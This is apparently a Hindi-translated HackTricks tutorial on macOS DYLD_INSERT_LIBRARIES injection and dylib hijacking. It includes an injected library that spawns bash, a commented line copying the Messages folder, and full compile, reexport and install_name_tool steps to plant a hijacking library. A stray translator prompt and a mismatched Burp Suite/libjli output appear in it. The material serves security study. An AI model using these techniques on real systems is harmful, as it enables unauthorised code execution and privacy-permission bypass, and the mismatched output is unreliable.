# macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES

{{#include ../../../../banners/hacktricks-training.md}}

## DYLD_INSERT_LIBRARIES का Basic example

**shell execute करने के लिए inject की जाने वाली Library:**
```c
// gcc -dynamiclib -o inject.dylib inject.c

#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
__attribute__((constructor))

void myconstructor(int argc, const char **argv)
{
syslog(LOG_ERR, "[+] dylib injected in %s\n", argv[0]);
printf("[+] dylib injected in %s\n", argv[0]);
execv("/bin/bash", 0);
//system("cp -r ~/Library/Messages/ /tmp/Messages/");
}
```
हमले के लिए Binary:
```c
// gcc hello.c -o hello
#include <stdio.h>

int main()
{
printf("Hello, World!\n");
return 0;
}
```
Injection:
```bash
DYLD_INSERT_LIBRARIES=inject.dylib ./hello
```
## Dyld Hijacking का उदाहरण

The targeted vulnerable binary is `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.

{{#tabs}}
{{#tab name="entitlements"}}

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash">codesign -dv --entitlements :- "/Applications/VulnDyld.app/Contents/Resources/lib/binary"
<strong>[...]com.apple.security.cs.disable-library-validation[...]
</strong></code></pre>

{{#endtab}}

{{#tab name="LC_RPATH"}}
```bash
# Check where are the @rpath locations
otool -l "/Applications/VulnDyld.app/Contents/Resources/lib/binary" | grep LC_RPATH -A 2
cmd LC_RPATH
cmdsize 32
path @loader_path/. (offset 12)
--
cmd LC_RPATH
cmdsize 32
path @loader_path/../lib2 (offset 12)
```
{{#endtab}}

{{#tab name="@rpath"}}
```bash
# Check libraries loaded using @rpath and the versions used
otool -l "/Applications/VulnDyld.app/Contents/Resources/lib/binary" | grep "@rpath" -A 3
name @rpath/lib.dylib (offset 24)
time stamp 2 Thu Jan  1 01:00:02 1970
current version 1.0.0
compatibility version 1.0.0
# Check the versions
```
{{#endtab}}
{{#endtabs}}

पिछली जानकारी से हमें पता है कि यह **loaded libraries का signature check नहीं कर रहा है** और यह **यहाँ से एक library load करने का प्रयास कर रहा है**:

- `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
- `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`

हालाँकि, पहली वाली मौजूद नहीं है:
```bash
pwd
/Applications/VulnDyld.app

find ./ -name lib.dylib
./Contents/Resources/lib2/lib.dylib
```
तो, इसे hijack करना संभव है! ऐसी library बनाएं जो **कुछ arbitrary code execute करे और legit library जैसी ही functionalities export करे**, उसे reexport करके। और इसे अपेक्षित versions के साथ compile करना याद रखें:
```objectivec:lib.m
#import <Foundation/Foundation.h>

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"[+] dylib hijacked in %s", argv[0]);
}
```
Please provide the Markdown content to translate.
```bash
gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation /tmp/lib.m -Wl,-reexport_library,"/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" -o "/tmp/lib.dylib"
# Note the versions and the reexport
```
Library में बनाया गया reexport path loader के सापेक्ष है; इसे export की जाने वाली library के absolute path में बदलते हैं:
```bash
#Check relative
otool -l /tmp/lib.dylib| grep REEXPORT -A 2
cmd LC_REEXPORT_DYLIB
cmdsize 48
name @rpath/libjli.dylib (offset 24)

#Change the location of the library absolute to absolute path
install_name_tool -change @rpath/lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" /tmp/lib.dylib

# Check again
otool -l /tmp/lib.dylib| grep REEXPORT -A 2
cmd LC_REEXPORT_DYLIB
cmdsize 128
name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
```
अंत में, इसे केवल **hijacked location** पर copy करें:
```bash
cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
```
और **execute** करें और जांचें कि **library was loaded**:

<pre class="language-context"><code class="lang-context">"/Applications/VulnDyld.app/Contents/Resources/lib/binary"
<strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib hijacked in /Applications/VulnDyld.app/Contents/Resources/lib/binary
</strong>Usage: [...]
</code></pre>

> [!TIP]
> इस vulnerability का abuse करके Telegram की camera permissions का abuse कैसे किया जा सकता है, इस पर एक अच्छा writeup [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/) पर मिल सकता है। <sup>[[1]](#references)</sup>

## बड़े पैमाने पर

यदि आप unexpected binaries में libraries inject करने का प्रयास कर रहे हैं, तो आप event messages को check करके पता लगा सकते हैं कि library किसी process के अंदर कब load होती है (इस स्थिति में `printf` और `/bin/bash` execution को हटा दें)।
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
```
## References

- [1] [CVE-2023-26818 - macOS में Telegram के साथ TCC को Bypass करना](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
{{#include ../../../../banners/hacktricks-training.md}}
